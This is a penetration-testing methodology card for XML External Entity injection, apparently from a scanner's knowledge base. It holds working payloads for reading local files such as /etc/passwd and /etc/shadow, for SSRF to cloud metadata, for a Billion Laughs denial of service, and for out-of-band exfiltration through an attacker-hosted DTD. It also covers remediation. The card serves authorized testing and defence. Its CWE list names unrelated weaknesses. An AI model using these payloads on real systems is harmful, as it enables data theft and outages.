---
id: WSTG-INPV-20
title: Testing for XML External Entity Injection
category: Input Validation
severity_range: High-Critical
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection
---

# WSTG-INPV-20: Testing for XML External Entity (XXE) Injection

## Summary

XML External Entity (XXE) Injection occurs when an XML parser processes external entity references defined in the Document Type Definition (DTD) of an XML document. When an application parses XML input from untrusted sources with external entity processing enabled, an attacker can define external entities that read local files, perform Server-Side Request Forgery (SSRF), execute denial of service via recursive entity expansion (Billion Laughs attack), or exfiltrate data through out-of-band (OOB) channels. XXE is distinct from general XML injection -- XXE specifically exploits the XML parser's entity processing feature rather than manipulating the XML document structure. XXE affects any application that parses XML: REST/SOAP APIs, file uploads (DOCX, XLSX, SVG), SAML-based SSO, RSS/Atom feeds, and configuration parsers.

## Test Objectives

- Identify endpoints that parse XML input
- Test if the XML parser processes external entities
- Determine if local files can be read via XXE
- Test for SSRF through XXE entity resolution
- Assess blind XXE via out-of-band data exfiltration
- Test for denial of service via entity expansion

## Prerequisites

- Target application accepts XML input (APIs, file uploads, SOAP services, SAML)
- Docker pentest container capturing traffic
- An attacker-controlled server or OOB callback probe for OOB testing
- Knowledge of the server-side operating system (for file path payloads)

## Test Steps

### Step 1: Identify XML Parsing Endpoints

**CLI Actions:**
1. Use `curl` to identify all requests with XML content
2. Use `curl` with pattern `(text/xml|application/xml|application/soap|application/xhtml|image/svg|<\?xml)` to find XML-based traffic
3. Identify XML parsing entry points:
   - SOAP web service endpoints
   - REST APIs accepting `Content-Type: application/xml`
   - File upload features (DOCX, XLSX, SVG, XML)
   - SAML authentication endpoints
   - RSS/Atom feed parsers
   - XML-RPC endpoints
4. Use `save to manual-review file` for each XML endpoint

### Step 2: Test for Basic XXE - File Reading

**CLI Actions:**
Use `curl` to inject a DTD with an external entity referencing a local file:

**Linux target:**
```
POST /api/parse HTTP/1.1
Host: target.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data><value>&xxe;</value></data>
```

**Windows target:**
```
POST /api/parse HTTP/1.1
Host: target.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<data><value>&xxe;</value></data>
```

If the response contains the file contents (e.g., `root:x:0:0:...`), XXE is confirmed.

### Step 3: Test for XXE via SSRF

**CLI Actions:**
Use `curl` to test if the XML parser can make network requests:

**HTTP SSRF:**
```
POST /api/parse HTTP/1.1
Host: target.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<data><value>&xxe;</value></data>
```

**Internal network scanning:**
```
POST /api/parse HTTP/1.1
Host: target.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1/">
]>
<data><value>&xxe;</value></data>
```

**DNS-based detection:**
```
POST /api/parse HTTP/1.1
Host: target.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://unique-id.collaborator.example/">
]>
<data><value>&xxe;</value></data>
```

### Step 4: Test for Blind XXE via Out-of-Band (OOB) Exfiltration

**CLI Actions:**
When the entity value is not reflected in the response, use OOB techniques. Use `curl`:

**Parameter entity with external DTD:**
```
POST /api/parse HTTP/1.1
Host: target.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://collaborator.example/evil.dtd">
  %xxe;
]>
<data><value>test</value></data>
```

The external DTD (`evil.dtd`) hosted on the attacker's server:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://collaborator.example/?data=%file;'>">
%eval;
%exfil;
```

**Using PHP filters for base64 encoding (PHP backends):**
```
POST /api/parse HTTP/1.1
Host: target.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<data><value>&xxe;</value></data>
```

Use `base64 -d` to decode the exfiltrated data.

### Step 5: Test for XXE via File Upload

**CLI Actions:**
Many file formats are XML-based. Use `curl` with crafted files:

**SVG upload with XXE:**
```
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="evil.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="0" y="50">&xxe;</text>
</svg>
------boundary--
```

**XLSX (Excel) with XXE:**
XLSX files are ZIP archives containing XML. Inject XXE into `[Content_Types].xml` or `xl/sharedStrings.xml` within the archive.

**DOCX with XXE:**
Similarly, DOCX files contain XML. Inject into `word/document.xml`.

### Step 6: Test for XXE in SAML

**CLI Actions:**
SAML assertions are XML-based. Use `curl` to inject XXE into SAML responses:

```
POST /saml/acs HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

SAMLResponse=<base64-encoded-saml-with-xxe>
```

Use `base64` to encode the SAML assertion containing:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

### Step 7: Test for Denial of Service (Billion Laughs)

**CLI Actions:**
Use `curl` with a recursive entity expansion payload:

```
POST /api/parse HTTP/1.1
Host: target.com
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<data><value>&lol5;</value></data>
```

**CAUTION:** This payload causes exponential memory consumption and can crash the server. Use carefully and only with permission.

### Step 8: Test for Error-Based XXE

**CLI Actions:**
Use `curl` to trigger errors that leak file contents:

```
POST /api/parse HTTP/1.1
Host: target.com
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<data>test</data>
```

The error message may contain the contents of `/etc/passwd` as part of the invalid file path.

Use `rynix_plugin_run('template-scan')` to check if the template-scan plugin has identified any XXE findings.

## Payloads

### Basic XXE File Read Payloads
```
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><data>&xxe;</data>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><data>&xxe;</data>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><data>&xxe;</data>
```

### SSRF via XXE Payloads
```
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><data>&xxe;</data>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><data>&xxe;</data>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1/">]><data>&xxe;</data>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://collaborator.example/ssrf">]><data>&xxe;</data>
```

### Blind XXE (OOB) Payloads
```
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://collaborator.example/evil.dtd">%xxe;]><data>test</data>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://collaborator.example/?test">%xxe;]><data>test</data>
```

### External DTD for OOB Exfiltration
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://collaborator.example/?d=%file;'>">
%eval;
%exfil;
```

### PHP Filter-Based XXE
```
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><data>&xxe;</data>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><data>&xxe;</data>
```

### XXE in SVG
```
<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

### XXE in SOAP
```
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><data>&xxe;</data></soap:Body></soap:Envelope>
```

### Billion Laughs (DoS)
```
<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">]><data>&lol4;</data>
```

### Error-Based XXE
```
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">%eval;%error;]><data>test</data>
```

## Detection Criteria

A finding should be logged when:
- External entity definitions result in file contents being included in the response
- SSRF requests to internal or cloud metadata endpoints are made by the XML parser
- OOB interactions (DNS, HTTP) are received from the target server
- Error messages contain file contents or entity resolution details
- Entity expansion causes excessive response times or server resource consumption
- XML parser processes DTDs and resolves external entity references

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| File read of sensitive data (credentials, config, source code) | Critical |
| SSRF to cloud metadata service (AWS/GCP/Azure credentials) | Critical |
| Blind XXE with OOB data exfiltration confirmed | High |
| SSRF to internal services via XXE | High |
| XXE in file upload (SVG, DOCX, XLSX) leading to file read | High |
| Denial of service via Billion Laughs / entity expansion | Medium |
| Error-based XXE leaking partial file contents | Medium |
| External entity resolved but limited to non-sensitive data | Medium |
| DNS interaction confirms XXE but no data exfiltration | Low |

## Remediation

- Disable external entity processing in the XML parser:
  - **Java:** `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`
  - **Python (lxml):** Use `defusedxml` library or set `resolve_entities=False`
  - **PHP:** `libxml_disable_entity_loader(true)` (PHP < 8.0) or use `LIBXML_NOENT` flag carefully
  - **.NET:** Set `XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit`
  - **Ruby:** Use Nokogiri with `NOENT` disabled
- Disable DTD processing entirely if not needed
- Use JSON instead of XML for data interchange where possible
- Validate and sanitize XML input against a schema (XSD) that does not allow DTDs
- Apply input size limits to prevent entity expansion DoS
- Use XML parsers that are secure by default (e.g., `defusedxml` for Python)
- For file uploads, re-parse and re-serialize XML-based files (DOCX, XLSX, SVG) to strip DTDs

## References

- [OWASP Testing Guide - XML Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection)
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)
- [CWE-827: Improper Control of Document Type Definition](https://cwe.mitre.org/data/definitions/827.html)
- [technique - XXE Injection](https://owasp.org/web-security/xxe)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V5 Validation — input handling and parser differentials.
- V12 Files and Resources — upload and inclusion controls.

## CWE references

- CWE-20: Improper Input Validation
- CWE-89: SQL Injection
- CWE-79: Cross-site Scripting

## Rynix tooling

- Primary tools: ``http_probe``, ``rynix_plugin_run` (template-scan)`, ``record_finding``

## Test focus

- Fuzz parameters with encoding variants (URL, Unicode, double-encoding).
- Switch Content-Type to traverse alternate validators.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

